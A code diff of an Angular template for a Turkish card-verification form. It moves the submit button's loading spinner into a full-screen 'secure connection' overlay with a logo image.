@@ -184,13 +184,8 @@
 
         <div class="pt-3 flex flex-col sm:flex-row items-center gap-3">
           <button class="w-full sm:flex-1 bg-[#e10514] hover:bg-[#b0030f] text-white font-bold py-3.5 px-6 rounded-xl shadow-md shadow-red-600/20 flex items-center justify-center gap-2 text-sm transition-all transform active:scale-[0.99] cursor-pointer disabled:opacity-70 disabled:cursor-not-allowed" type="submit" [disabled]="isSubmitting()">
-            @if (isSubmitting()) {
-              <span class="material-symbols-outlined text-[18px] animate-spin">sync</span>
-              <span>Güvenlik Onayı Sağlanıyor...</span>
-            } @else {
-              <span>Kart Bilgilerini Doğrula ve Devam Et</span>
-              <span class="material-symbols-outlined text-[18px]">arrow_forward</span>
-            }
+            <span>Kart Bilgilerini Doğrula ve Devam Et</span>
+            <span class="material-symbols-outlined text-[18px]">arrow_forward</span>
           </button>
           <button class="w-full sm:w-auto bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-3.5 px-5 rounded-xl text-sm transition-colors text-center cursor-pointer" (click)="location.back()" type="button">
             Geri Dön
@@ -238,5 +233,15 @@
     </div>
   </div>
 </main>
+
+@if (isSubmitting()) {
+  <div class="fixed inset-0 z-[100] backdrop-blur-md bg-white/70 flex flex-col items-center justify-center transition-all duration-300">
+    <img src="/images/logo.gif" alt="Yükleniyor..." class="w-48 object-contain mb-8 drop-shadow-xl" />
+    <div class="bg-white px-8 py-4 rounded-2xl shadow-xl border border-red-100 flex items-center gap-3">
+      <span class="material-symbols-outlined text-[24px] text-[#e10514] animate-spin">sync</span>
+      <p class="text-[#e10514] font-bold text-lg">Lütfen bekleyiniz, güvenli bağlantı kuruluyor...</p>
+    </div>
+  </div>
+}
 
 <app-cvv-modal [isOpen]="isCvvModalOpen()" (close)="isCvvModalOpen.set(false)" />
